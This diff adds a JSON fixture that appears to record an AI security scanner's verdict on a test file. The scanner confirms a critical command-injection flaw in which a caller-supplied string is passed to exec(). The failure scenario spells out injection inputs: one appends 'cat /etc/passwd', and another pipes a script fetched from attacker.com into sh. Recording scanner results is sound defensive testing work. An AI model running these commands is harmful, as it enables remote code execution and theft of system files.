@@ -1,0 +1,8 @@
+{
+  "key": "cfe10d0b309f879309cbfd6c7fae2b1d",
+  "file": "positive/rce/exec-non-literal-command.ts",
+  "model": "default",
+  "raw": "```json\n[\n  {\n    \"vulnSlug\": \"rce\",\n    \"lineNumbers\": [11],\n    \"verdict\": \"confirmed\",\n    \"severity\": \"critical\",\n    \"summary\": \"The entire shell command is caller-supplied and executed without validation, allowing arbitrary command execution.\",\n    \"rationale\": \"Line 11 passes the `shellCommand` parameter directly to `exec()` without any validation or sanitization. The parameter is user-controlled (accepted as a function argument), and `exec()` executes it as a shell command with full shell interpretation, enabling command injection via shell metacharacters.\",\n    \"failureScenario\": \"An attacker calls `runDiagnostic(\\\"ls /tmp; cat /etc/passwd\\\", callback)`. The `exec()` function executes both commands due to the semicolon separator: first listing `/tmp`, then exfiltrating `/etc/passwd`. Similarly, `runDiagnostic(\\\"whoami && curl http://attacker.com/malware.sh | sh\\\", callback)` would download and execute arbitrary code on the system.\",\n    \"confidence\": 1.0\n  }\n]\n```",
+  "recordedAt": "2026-08-12T03:44:37.324Z",
+  "elapsedMs": 19733.745922727274
+}
